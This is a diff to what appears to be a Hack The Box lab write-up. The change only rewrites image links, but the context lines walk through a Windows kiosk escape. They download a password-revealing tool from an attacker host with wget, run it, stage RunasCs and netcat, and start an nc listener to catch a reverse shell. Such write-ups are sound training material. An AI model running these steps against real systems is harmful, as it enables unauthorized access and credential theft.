@@ -53,25 +53,25 @@ Nmap done: 1 IP address (1 host up) scanned in 22.17 seconds
 ```
 xfreerdp3 /v:10.129.234.51 /sec:tls /dynamic-resolution +clipboard /cert:ignore
 ```
-![[Pasted image 20251121135233.png]]
+![Image](/assets/img/htb-writeups/Pasted image 20251121135233.png)
 
 KioskUser0
 
 Windows key > Open edge from settings > navigate file directory
-![[Pasted image 20251121140255.png]]
+![Image](/assets/img/htb-writeups/Pasted image 20251121140255.png)
 Can run Edge > Powershell.exe download to file explorer but we can't navigate elsewhere
-![[Pasted image 20251121141916.png]]
+![Image](/assets/img/htb-writeups/Pasted image 20251121141916.png)
 Note: File suffixes are omitted by default in Windows, so simply renaming powershell to msedge will
 work.
 Import .xml profile in rdp app > failed
-![[Pasted image 20251121143214.png]]
+![Image](/assets/img/htb-writeups/Pasted image 20251121143214.png)
 
 ```
 wget http://10.10.14.97:8000/BulletsPassView.exe -O BPV.exe
 
 .\BPV.exe
 ```
-![[Pasted image 20251121143314.png]]
+![Image](/assets/img/htb-writeups/Pasted image 20251121143314.png)
 
 Download and move to windows: 
 RunasCs.exe 
@@ -81,5 +81,5 @@ nc64.exe
 ```
 
 nc -nvlp 4444
-![[Pasted image 20251121150938.png]]
+![Image](/assets/img/htb-writeups/Pasted image 20251121150938.png)
 
